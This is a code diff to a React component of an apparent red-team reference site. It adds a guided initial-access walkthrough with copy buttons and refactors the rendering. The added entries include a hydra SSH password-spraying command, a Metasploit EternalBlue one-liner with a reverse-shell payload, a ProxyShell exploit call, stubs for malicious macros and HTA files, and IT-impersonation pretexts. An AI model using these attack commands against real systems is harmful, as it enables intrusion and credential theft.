@@ -19,6 +19,50 @@ const InitialAccessTechniques = () => {
 
   const sections = [
     {
+      id: 'walkthrough',
+      title: 'Guided Initial Access Walkthrough',
+      content: [
+        {
+          type: 'markdown',
+          value: 'Follow this step-by-step chain for initial access. Expand each step for details and commands.'
+        },
+        {
+          type: 'step',
+          title: '1. Phishing & Malicious Documents',
+          description: 'Craft and deliver phishing payloads to the target.',
+          commands: [
+            { value: 'Sub AutoOpen() ...', description: 'Malicious Office macro (VBA)' },
+            { value: '<script> ... </script>', description: 'Malicious HTA file' },
+            { value: 'OneNote payload (PowerShell/iframe)', description: 'Malicious OneNote file' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '2. Exploiting Services',
+          description: 'Exploit exposed services and known vulnerabilities.',
+          commands: [
+            { value: 'hydra -L users.txt -P passwords.txt ssh://target.com', description: 'SSH password spraying' },
+            { value: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target.com; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit"', description: 'SMB exploitation (EternalBlue)' },
+            { value: 'python3 proxyshell.py -t https://exchange.target.com -u admin@target.com', description: 'ProxyShell exploit' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '3. Social Engineering',
+          description: 'Leverage social engineering to gain access.',
+          commands: [
+            { value: 'Pretexting: IT support scenario', description: 'Impersonate IT to collect credentials' },
+            { value: 'Baiting: USB drop', description: 'Drop malicious USBs in target environment' },
+            { value: 'Vishing: "Hello, this is John from IT..."', description: 'Phone-based credential harvesting' }
+          ]
+        },
+        {
+          type: 'markdown',
+          value: '**Tip:** After each step, validate access and document your findings!'
+        }
+      ]
+    },
+    {
       id: 'phishing',
       title: 'Phishing Payloads',
       content: [
@@ -170,36 +214,67 @@ evilginx -p ./phishlets/ -t o365.yaml -d login.target.com
             >
               {expandedSection === section.id && (
                 <div className="content-inner">
-                  {section.content.map((item, index) => (
-                    <div key={index} className="content-item">
-                      {item.type === 'command' ? (
-                        <div className="command-item">
-                          <div className="command-header">
-                            <code>{item.value}</code>
+                  {section.content.map((item, index) => {
+                    if (item.type === 'step') {
+                      return (
+                        <div key={index} className="content-item walkthrough-step">
+                          <div className="step-header">
+                            <strong>{item.title}</strong>
+                          </div>
+                          <div className="step-description">{item.description}</div>
+                          <div className="step-commands">
+                            {item.commands.map((cmd, i) => (
+                              <div key={i} className="command-item">
+                                <div className="command-header">
+                                  <code>{cmd.value}</code>
+                                  <button
+                                    onClick={() => handleCopy(cmd.value)}
+                                    className="copy-button small"
+                                  >
+                                    Copy
+                                  </button>
+                                </div>
+                                <p className="command-description">{cmd.description}</p>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      );
+                    } else if (item.type === 'command') {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="command-item">
+                            <div className="command-header">
+                              <code>{item.value}</code>
+                              <button
+                                onClick={() => handleCopy(item.value)}
+                                className="copy-button small"
+                              >
+                                Copy
+                              </button>
+                            </div>
+                            <p className="command-description">{item.description}</p>
+                          </div>
+                        </div>
+                      );
+                    } else {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="markdown-content">
+                            <ReactMarkdown>
+                              {item.value}
+                            </ReactMarkdown>
                             <button
-                              onClick={() => handleCopy(item.value)}
-                              className="copy-button small"
+                              onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
+                              className="copy-button"
                             >
-                              Copy
+                              Copy All
                             </button>
                           </div>
-                          <p className="command-description">{item.description}</p>
                         </div>
-                      ) : (
-                        <div className="markdown-content">
-                          <ReactMarkdown>
-                            {item.value}
-                          </ReactMarkdown>
-                          <button
-                            onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
-                            className="copy-button"
-                          >
-                            Copy All
-                          </button>
-                        </div>
-                      )}
-                    </div>
-                  ))}
+                      );
+                    }
+                  })}
                 </div>
               )}
             </motion.div>
